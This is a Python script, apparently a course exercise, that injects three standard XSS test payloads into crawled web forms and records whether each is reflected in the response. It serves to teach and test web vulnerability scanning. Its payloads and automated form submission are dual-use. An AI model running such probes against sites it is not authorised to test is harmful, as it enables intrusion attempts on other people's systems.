#!/usr/bin/env python3
"""
XSS tester (saves results)

Reads `crawler_output.json` (expected structure: {"pages": [...], "forms": { "<page>": [ {action,method,inputs}, ... ] }})
Injects XSS payloads into each form's inputs and attempts a GET/POST request.
Records for each payload: status_code, reflected (payload present in response), and any error.

Output: week4_xss_results.json
"""

import requests
from bs4 import BeautifulSoup
import json
from urllib.parse import urljoin

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "<svg onload=alert(1)>"
]

HEADERS = {"User-Agent": "WebScanPro-XSS-Tester"}
OUTFILE = "week4_xss_results.json"
INPUT_JSON = "crawler_output.json"  # change if your metadata filename is different

def load_metadata(path=INPUT_JSON):
    with open(path, "r") as f:
        return json.load(f)

def build_bs4_form(form_details):
    """
    Reconstruct a minimal <form> element from stored form_details so existing test_xss_form can use it.
    form_details: {"action":..., "method":..., "inputs":[...]}
    """
    action = form_details.get("action", "")
    method = form_details.get("method", "get").lower()
    inputs = form_details.get("inputs", []) or []
    form_html = f'<form action="{action}" method="{method}">'
    for inp in inputs:
        # create simple input elements; if input is dict allow name/type
        if isinstance(inp, dict):
            name = inp.get("name") or ""
        else:
            name = str(inp)
        form_html += f'<input name="{name}"/>'
    form_html += "</form>"
    return BeautifulSoup(form_html, "html.parser").form

def test_xss_form(page_url, form, form_details):
    """Test a single reconstructed BeautifulSoup form with all XSS payloads.
       Returns list of result dicts for that form.
    """
    results = []
    action = form_details.get("action") or ""
    method = form_details.get("method", "get").lower()
    target_url = urljoin(page_url, action) if action else page_url

    inputs = form.find_all("input")
    input_names = [inp.get("name") for inp in inputs if inp.get("name")]

    for payload in XSS_PAYLOADS:
        row = {
            "target_page": page_url,
            "form_action": action,
            "form_method": method,
            "input_names": input_names,
            "payload": payload,
            "status_code": None,
            "reflected": False,
            "error": None,
        }

        data = {name: payload for name in input_names}

        try:
            if method == "post":
                r = requests.post(target_url, data=data, headers=HEADERS, timeout=10, allow_redirects=True)
            else:
                r = requests.get(target_url, params=data, headers=HEADERS, timeout=10, allow_redirects=True)

            row["status_code"] = r.status_code
            body = r.text or ""
            # simple heuristic: payload appears in response body
            row["reflected"] = payload in body
        except Exception as e:
            row["error"] = repr(e)

        results.append(row)

    return results

def main():
    meta = load_metadata()
    results_summary = {
        "tested_on": meta.get("tested_target") if isinstance(meta, dict) and meta.get("tested_target") else "from crawler_output.json",
        "pages": {},
    }

    forms_meta = meta.get("forms", {}) if isinstance(meta, dict) else {}

    print("[+] Starting XSS tests...")

    for page_url, forms in forms_meta.items():
        print(f"[+] Testing forms on {page_url} (found {len(forms)})")
        page_results = []
        for idx, form_details in enumerate(forms, start=1):
            bs4_form = build_bs4_form(form_details)
            form_results = test_xss_form(page_url, bs4_form, form_details)
            page_results.extend(form_results)
        results_summary["pages"][page_url] = page_results

    # Also, if you have meta["pages"] and want to test URL params, we could add that here later.

    # Save results
    with open(OUTFILE, "w") as f:
        json.dump(results_summary, f, indent=2)

    print(f"[+] XSS testing complete. Results saved to {OUTFILE}")

if __name__ == "__main__":
    main()